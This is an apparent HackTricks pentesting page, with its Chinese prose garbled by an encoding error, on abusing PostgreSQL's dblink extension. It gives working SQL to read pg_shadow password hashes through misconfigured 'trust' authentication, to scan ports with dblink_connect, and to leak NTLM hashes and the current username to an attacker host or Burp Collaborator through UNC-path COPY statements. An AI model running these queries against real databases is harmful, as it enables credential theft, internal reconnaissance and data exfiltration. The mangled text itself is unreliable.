<details>

<summary><strong>é›¶åŸºç¡€å­¦ä¹  AWS é»‘å®¢æ”»å‡»ç›´è‡³æˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢ [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“ **æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


è‡ª **PostgreSQL 9.1** èµ·ï¼Œå®‰è£…é¢å¤–æ¨¡å—å˜å¾—ç®€å•ã€‚[æ³¨å†Œçš„æ‰©å±•å¦‚ `dblink`](https://www.postgresql.org/docs/current/contrib.html) å¯ä»¥é€šè¿‡ [`CREATE EXTENSION`](https://www.postgresql.org/docs/current/sql-createextension.html) å®‰è£…ï¼š
```sql
CREATE EXTENSION dblink;
```
ä¸€æ—¦ä½ åŠ è½½äº†dblinkï¼Œä½ å¯ä»¥æ‰§è¡Œä¸€äº›æœ‰è¶£çš„æŠ€å·§ï¼š

## æƒé™æå‡

æ–‡ä»¶ `pg_hba.conf` å¯èƒ½é…ç½®ä¸å½“ï¼Œ**å…è®¸æ¥è‡ª** **localhost çš„ä»»ä½•ç”¨æˆ·** è¿æ¥ï¼Œè€Œæ— éœ€çŸ¥é“å¯†ç ã€‚è¿™ä¸ªæ–‡ä»¶é€šå¸¸å¯ä»¥åœ¨ `/etc/postgresql/12/main/pg_hba.conf` æ‰¾åˆ°ï¼Œä¸€ä¸ªä¸å½“çš„é…ç½®çœ‹èµ·æ¥åƒï¼š
```
local    all    all    trust
```
è¯·æ³¨æ„ï¼Œè¿™ç§é…ç½®é€šå¸¸ç”¨äºåœ¨ç®¡ç†å‘˜å¿˜è®°å¯†ç æ—¶ä¿®æ”¹æ•°æ®åº“ç”¨æˆ·çš„å¯†ç ï¼Œå› æ­¤æœ‰æ—¶æ‚¨å¯èƒ½ä¼šå‘ç°å®ƒã€‚\
è¿˜è¦æ³¨æ„ï¼Œæ–‡ä»¶ pg_hba.conf åªèƒ½ç”± postgres ç”¨æˆ·å’Œç»„è¯»å–ï¼Œä¸”åªèƒ½ç”± postgres ç”¨æˆ·å†™å…¥ã€‚

å¦‚æœæ‚¨**å·²ç»**åœ¨å—å®³è€…ç³»ç»Ÿä¸­è·å¾—äº†ä¸€ä¸ª**shell**ï¼Œè¿™ç§æƒ…å†µå°†**éå¸¸æœ‰ç”¨**ï¼Œå› ä¸ºå®ƒå°†å…è®¸æ‚¨è¿æ¥åˆ° postgresql æ•°æ®åº“ã€‚

å¦ä¸€ç§å¯èƒ½çš„é”™è¯¯é…ç½®å¦‚ä¸‹ï¼š
```
host    all     all     127.0.0.1/32    trust
```
ç”±äºå®ƒå…è®¸æ¥è‡ª localhost çš„ä»»ä½•äººä»¥ä»»ä½•ç”¨æˆ·èº«ä»½è¿æ¥åˆ°æ•°æ®åº“ã€‚
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœ **`dblink`** å‡½æ•°**æ­£å¸¸å·¥ä½œ**ï¼Œæ‚¨å¯ä»¥é€šè¿‡å·²å»ºç«‹çš„è¿æ¥è¿æ¥åˆ°æ•°æ®åº“å¹¶è®¿é—®æœ¬ä¸åº”è¯¥è®¿é—®çš„æ•°æ®ï¼Œä»è€Œ**æå‡æƒé™**ï¼š
```sql
SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'SELECT datname FROM pg_database')
RETURNS (result TEXT);

SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'select usename, passwd from pg_shadow')
RETURNS (result1 TEXT, result2 TEXT);
```
**æŸ¥æ‰¾** [**å…³äºæ­¤æ”»å‡»çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…æœ¬æ–‡**](http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt)**ã€‚**

## ç«¯å£æ‰«æ

æ»¥ç”¨ `dblink_connect` ä¹Ÿå¯ä»¥**æœç´¢å¼€æ”¾ç«¯å£**ã€‚å¦‚æœè¯¥**å‡½æ•°ä¸èµ·ä½œç”¨ï¼Œæ‚¨åº”è¯¥å°è¯•ä½¿ç”¨ `dblink_connect_u()`**ï¼Œå› ä¸ºæ–‡æ¡£ä¸­è¯´ _`dblink_connect_u()` ä¸ `dblink_connect()` ç›¸åŒï¼Œé™¤äº†å®ƒå…è®¸éè¶…çº§ç”¨æˆ·ä½¿ç”¨ä»»ä½•è®¤è¯æ–¹æ³•è¿æ¥_ã€‚
```sql
SELECT * FROM dblink_connect('host=216.58.212.238
port=443
user=name
password=secret
dbname=abc
connect_timeout=10');
//Different response
// Port closed
RROR:  could not establish connection
DETAIL:  could not connect to server: Connection refused
Is the server running on host "127.0.0.1" and accepting
TCP/IP connections on port 4444?

// Port Filtered/Timeout
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTP server
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTPS server
ERROR:  could not establish connection
DETAIL:  received invalid response to SSL negotiation:
```
è¯·æ³¨æ„ï¼Œåœ¨ä½¿ç”¨ `dblink_connect` æˆ– `dblink_connect_u` **ä¹‹å‰**ï¼Œæ‚¨å¯èƒ½éœ€è¦æ‰§è¡Œï¼š
```
CREATE extension dblink;
```
## UNCè·¯å¾„ - NTLMå“ˆå¸Œæ³„éœ²
```sql
-- can be used to leak hashes to Responder/equivalent
CREATE TABLE test();
COPY test FROM E'\\\\attacker-machine\\footestbar.txt';
```

```sql
-- to extract the value of user and send it to Burp Collaborator
CREATE TABLE test(retval text);
CREATE OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$
DECLARE sqlstring TEXT;
DECLARE userval TEXT;
BEGIN
SELECT INTO userval (SELECT user);
sqlstring := E'COPY test(retval) FROM E\'\\\\\\\\'||userval||E'.xxxx.burpcollaborator.net\\\\test.txt\'';
EXECUTE sqlstring;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT testfunc();
```
<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
